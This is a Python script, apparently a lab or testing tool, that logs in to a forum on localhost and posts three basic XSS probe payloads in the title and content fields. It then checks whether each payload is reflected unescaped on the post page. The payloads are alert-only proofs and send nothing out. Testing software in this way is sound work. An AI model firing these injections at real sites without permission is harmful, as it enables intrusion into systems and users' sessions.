import requests
from bs4 import BeautifulSoup
from urlparse import urljoin

# URLs for the login, forum, post submission, and viewing individual posts
login_url = "http://localhost/Target/login.php"
forum_url = "http://localhost/Target/forum.php"
post_url = "http://localhost/Target/post.php"
view_post_url = "http://localhost/Target/view_post.php"

# Refined XSS payloads to test
payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'/>",
    "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
]

# Login credentials for the test user
login_data = {
    'username': 'test',  # Test user username
    'password': 'test',  # Test user password
    'login': 'Login'
}

# Function to detect XSS
def detect_xss():
    session = requests.Session()  # Use a session to persist cookies, etc.

    # Log in to the website
    response = session.post(login_url, data=login_data)
    if response.status_code != 200:
        print("Failed to log in.")
        return

    # Check if login was successful by accessing the forum page
    response = session.get(forum_url)
    if response.status_code != 200 or 'Login' in response.text or 'login.php' in response.text.lower():
        print("Login failed or not redirected correctly.")
        return

    for payload in payloads:
        # Prepare form data for post submission
        form_data = {
            'title': payload,  # Use the payload for the title
            'content': payload,  # Use the payload for the content
            'post_submit': 'Submit'
        }

        # Submit form data with payload
        response = session.post(post_url, data=form_data)
        if response.status_code != 200:
            print("Failed to submit the form.")
            continue

        # Retrieve the forum page to find the newly created post
        response = session.get(forum_url)
        if response.status_code != 200:
            print("Failed to retrieve the forum page.")
            continue

        # Parse the forum page to extract post links
        soup = BeautifulSoup(response.text, 'html.parser')
        post_links = soup.find_all('a', href=True)

        post_id = None
        for link in post_links:
            href = link['href']
            if 'view_post.php?id=' in href:
                post_id = href.split('=')[1]
                break
        
        if not post_id:
            print("Failed to find the post ID in the forum page.")
            continue

        # Retrieve the individual post page to check for reflected payload
        post_view_url = "{}?id={}".format(view_post_url, post_id)
        response = session.get(post_view_url)
        if response.status_code != 200:
            print("Failed to retrieve the post page.")
            continue

        # Check if payloads are reflected in the response
        post_content = response.text
        if payload in post_content:
            print("Potential XSS vulnerability detected at {}".format(post_view_url))
        else:
            print("No reflection for payload: {} at {}".format(payload, post_view_url))

# Run the detector
detect_xss()
